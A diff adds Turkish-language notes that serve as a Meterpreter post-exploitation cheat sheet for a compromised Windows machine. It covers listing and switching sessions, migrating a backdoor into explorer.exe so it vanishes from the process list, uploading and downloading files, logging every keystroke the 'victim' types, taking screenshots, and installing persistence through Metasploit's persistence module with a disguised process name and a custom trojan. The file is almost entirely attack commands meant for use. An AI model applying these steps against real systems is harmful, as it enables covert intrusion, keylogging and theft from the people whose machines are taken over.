@@ -1,0 +1,26 @@
+sessions -l   : sessionları listeler
+sessions -1   : 1 numaralı sessiona geçiş yapar
+background    : aktif olarak kullandığımız sessonu kapatmadan arkaplana alır. Böylece diğer sessionlara geçiş yapmamıza olanak sağlar.
+sysinfo       : sistem bilgisini görüntüler.
+help          : kullanabileceğimiz işlemleri görüntüler
+ps(process)   : bilgisayarda çalışıyor olan işlemleri gösterir.
+	PID denilen şey process id'dir
+	kendi trojanımızı o listeden görüp windowsta düzenli olan başka bir işlemin içerine gizleyebiliriz
+migrate 2824  : migrate göç anlamına gelir. backdoorumuzu 2824 PID'sine sahip olan işleme geçiş yapar. Bizim winde 2824 explorer.exe idi
+	migrate işleminden sonra ps komutu çalışılırsa o ekranda backdoorumuz görünmez. Hackten sonra yapılması gerekilen ilk işlemdir
+upload komutuyla yükleme, download komutuyla ise direkt roota indirme yapabiliriz
+keyscan_start : victim'in klavyeden girdiği her şeyi kaydetmeye başlar.
+	keyscan_dump dediğimiz zaman sniffer durur ve o zaman verileri terminalimize yazdırır.
+screenshot    : ss alır
+
+
+Baglantımızı sürekli hale getirmek için
+background 
+use exploit/windows/local/persistence
+show options
+set EXE_NAME   : Victimin bilgisayarında sürekli olarak çalışacak bu işlemin ismi dikkat çekmeyen bir işlem olmalı. winexplore.exe gibi
+set SESSION    : 1 (Hangi sessionu işliyorsak)
+show advanced
+set EXE::Custom /var/www/html/backdoors/new_backdoor.exe : Bu seçenegi advanced sekmesinden görebiliriz. İşlem yapılmazsa sistem kendi hazırladıgı bi trojanı atayacaktır. Biz ise kendi hazırladığımız trojanın kendi bilgisayarımızdaki pathini girerek onu atıyoruz.
+exploit
+
